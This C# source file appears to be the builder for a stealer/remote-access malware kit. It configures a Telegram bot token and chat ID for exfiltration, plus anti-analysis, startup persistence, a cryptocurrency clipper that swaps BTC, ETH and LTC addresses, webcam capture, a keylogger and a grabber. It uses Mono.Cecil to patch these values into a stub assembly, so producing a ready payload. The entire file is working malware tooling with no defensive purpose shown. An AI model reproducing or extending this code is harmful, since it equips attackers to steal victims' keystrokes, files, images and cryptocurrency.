using Mono.Cecil;
using Mono.Cecil.Cil;
using System.IO;

namespace BuilderGUI
{
    internal sealed class Build
    {
        private static readonly Random random = new();

        public static readonly Dictionary<string, string> ConfigValues = new()
        {
            {"TelegramAPI", ""},         // Stores the encrypted Telegram bot API token
            {"TelegramID", ""},          // Stores the encrypted Telegram chat ID
            {"Debug", ""},               // Stores debug setting
            {"AntiAnalysis", ""},        // Stores anti-analysis setting
            {"Startup", ""},             // Stores startup option setting
            {"StartDelay", ""},          // Stores start delay option
            {"ClipperBTC", ""},          // Stores encrypted Bitcoin address for clipper
            {"ClipperETH", ""},          // Stores encrypted Ethereum address for clipper
            {"ClipperLTC", ""},          // Stores encrypted Litecoin address for clipper
            {"WebcamScreenshot", ""},    // Stores webcam screenshot option
            {"Keylogger", ""},           // Stores keylogger setting
            {"Clipper", ""},             // Stores clipper option
            {"Grabber", ""},             // Stores grabber setting
            {"Mutex", RandomString(20)}  // Generates a random mutex string
        };


        private static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static AssemblyDefinition ReadStub(string stubPath)
        {
            if (!File.Exists(stubPath))
                throw new FileNotFoundException("Stub file not found.", stubPath);

            return AssemblyDefinition.ReadAssembly(stubPath);
        }

        private static void WriteStub(AssemblyDefinition definition, string outputPath)
        {
            definition.Write(outputPath);
        }

        private static string ReplaceConfigParams(string value)
        {
            // If the value contains the key, perform the replacement
            foreach (KeyValuePair<string, string> config in ConfigValues)
            {
                if (value.Contains($"--- {config.Key} ---"))
                {
                    return config.Value; // Replace with the actual config value
                }
            }

            return value; // Return the original value if no replacement is made
        }

        public static AssemblyDefinition IterValues(AssemblyDefinition definition)
        {
            foreach (ModuleDefinition module in definition.Modules)
            {
                foreach (TypeDefinition type in module.Types)
                {
                    if (type.Name.Equals("Config"))
                    {
                        foreach (MethodDefinition method in type.Methods)
                        {
                            if (method.IsConstructor && method.HasBody)
                            {
                                foreach (Instruction instruction in method.Body.Instructions)
                                {
                                    if (instruction.OpCode.Code == Code.Ldstr &&
                                        instruction.Operand is string operand &&
                                        operand.StartsWith("---") && operand.EndsWith("---"))  // More flexible check
                                    {
                                        instruction.Operand = ReplaceConfigParams(operand);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return definition;
        }


        public static string BuildStub(string outputPath, string stubPath)
        {
            AssemblyDefinition definition = ReadStub(stubPath);
            definition = IterValues(definition);
            WriteStub(definition, outputPath);
            return outputPath;
        }
    }
}
